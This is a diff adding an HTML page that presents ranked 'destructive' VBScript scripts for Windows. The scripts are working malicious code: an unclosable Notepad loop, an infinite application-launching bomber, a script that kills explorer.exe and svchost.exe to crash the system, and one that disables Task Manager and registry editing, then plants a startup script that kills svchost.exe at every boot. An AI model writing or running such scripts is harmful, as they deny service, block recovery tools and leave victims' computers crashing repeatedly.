@@ -1,0 +1,93 @@
+<h1>
+  Ranks
+</h1>
+
+<ul>
+<li>Level 1 - 4: Newbie</li>
+
+<li>Level 5 - 8: Destructive</li>
+
+<li>Level 9 - 12: Super Destructive</li>
+
+<li>Level 12 - 15: Hyper Destructive</li>
+
+<li>Level 15 - 18: Computer Killer</li>
+
+<li>Level 19 - 22: Computer Destroyer</li>
+</ul>
+<br>
+<h1>Level 1 (Unopenable Notepad):</h1>
+<span class="code">
+Dim objShell, objWMIService, colProcesses
+
+Set objShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
+Do
+    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'notepad.exe'")
+    
+    If colProcesses.Count = 0 Then
+        objShell.Run "notepad", 1, True
+    Else
+        Dim hwnd
+        hwnd = objShell.AppActivate("Notepad")
+        
+        If hwnd Then
+            objShell.AppActivate "Notepad"
+        End If
+    End If
+Loop
+</span>
+
+<h1>Level 2 (Application Bomber):</h1>
+<span class="code">
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+
+Do
+    objShell.Run "winword"
+    objShell.Run "chrome"
+    objShell.Run "calc"
+    objShell.Run "mspaint"
+    objShell.Run "notepad"
+    objShell.Run "cmd"
+    objShell.Run "write"
+    objShell.Run "explorer"
+    objShell.Run "control"
+Loop
+</span>
+
+<h1>Level 5 (Command Prompt BSOD):</h1>
+<span class="code">
+Dim shell, I
+
+Set shell = CreateObject("WScript.Shell")
+
+shell.Run "taskkill /f /im explorer.exe"
+
+For I = 1 To 20
+    shell.Run "cmd"
+Next
+
+shell.Run "taskkill /f /im svchost.exe"</span>
+
+<h1>Level 1(Endless BSOD):</h1>
+<span class="code">Dim shell, FSO
+
+Set shell = CreateObject("WScript.Shell")
+
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
+shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
+shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f"
+
+Set OutPutFile = FSO.OpenTextFile(shell.SpecialFolders("Startup") & "\test.vbs", 8, True)
+
+OutPutFile.WriteLine "Dim shell"
+OutPutFile.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
+OutPutFile.WriteLine "shell.Run """"taskkill /f /im svchost.exe"""""
+OutPutFile.Close
+
+Set FSO = Nothing
+shell.Run "taskkill /f /im svchost.exe"
+</span>
